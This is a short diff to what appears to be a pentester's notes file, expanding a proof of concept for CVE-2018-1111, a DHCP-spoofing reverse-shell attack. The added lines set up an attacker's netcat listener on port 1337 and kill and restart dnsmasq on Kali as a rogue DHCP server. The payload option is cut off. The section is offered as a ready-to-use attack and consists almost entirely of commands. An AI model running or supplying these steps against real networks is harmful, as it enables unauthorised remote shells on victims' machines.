@@ -978,6 +978,11 @@ find . -name "*.js" | xargs grep -i "JSESSIONID"
 # CVE-2018-1111 tweetable DHCP欺骗远程反弹shell PoC :) 
 
 ```
+hacker server:
+nc -l -p 1337 -v
+
+in kali,start dhcp server:
+killall dnsmasq
 dnsmasq --interface=eth0 --bind-interfaces \
 --except-interface=lo --dhcp-range=10.1.1.1,10.1.1.10,1h \
 --conf-file=/dev/null --dhcp-option=6,10.1.1.1 \
